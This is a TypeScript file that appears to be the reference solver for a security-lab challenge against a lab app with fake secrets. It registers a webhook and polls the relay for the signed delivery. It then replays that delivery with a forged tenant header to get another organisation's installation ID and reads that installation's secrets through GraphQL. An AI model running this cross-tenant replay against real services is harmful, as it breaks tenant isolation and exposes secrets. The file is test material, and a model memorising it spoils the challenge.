// CH-C2 reference runner: webhook registration -> delivery poll -> replay -> nested secret read.
import type { CompositeProofReceipt } from '../../../lib/types.ts'
import type { SolverContext } from './context.ts'

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

interface DeliveryView {
  delivery: { id: string; status: string; body: string; signature: string }
}

export async function solveC2(ctx: SolverContext): Promise<CompositeProofReceipt | null> {
  const plan = ctx.lab.plan
  const prefix = plan.routePrefix
  const session = await ctx.login('member_b')

  const registered = await ctx.http('api', `${prefix}/webhooks`, {
    method: 'POST', token: session,
    body: { url: 'https://hooks.partner.example/inbound', events: ['app.updated'] },
  })
  if (registered.status !== 201) return null
  const registration = registered.json<{ deliveryId?: string }>()
  const deliveryId = registration.deliveryId
  if (!deliveryId) return null

  let delivery: DeliveryView['delivery'] | null = null
  for (let attempt = 0; attempt < 80; attempt++) {
    const polled = await ctx.http('webhook-relay', `/deliveries/${deliveryId}`)
    if (polled.status !== 200) return null
    const view = polled.json<DeliveryView>().delivery
    if (view.status === 'ready') {
      delivery = view
      break
    }
    if (view.status === 'failed' || view.status === 'cancelled') return null
    await sleep(15)
  }
  if (!delivery) return null

  const replay = await ctx.http('api', `${prefix}/webhooks/replay`, {
    method: 'POST',
    rawBody: delivery.body,
    headers: {
      'x-signature': delivery.signature,
      'x-app-tenant': 'org_a',
      'x-delivery-id': deliveryId,
    },
  })
  if (replay.status !== 200) return null
  const installation = replay.json<{ installation?: string }>().installation
  if (!installation) return null

  const query = await ctx.http('api', `${prefix}/graphql`, {
    method: 'POST', token: session,
    body: {
      query: 'query AppSecrets { appInstallation { id secrets { id value } } }',
      installation,
    },
  })
  if (query.status !== 200) return null
  const data = query.json<{ data?: { appInstallation?: { secrets?: Array<{ value?: string }> } } }>()
  const secret = data.data?.appInstallation?.secrets?.[0]?.value ?? ''
  if (!secret.startsWith('mh_fake_secret_')) return null

  return ctx.confirm('CH-C2')
}
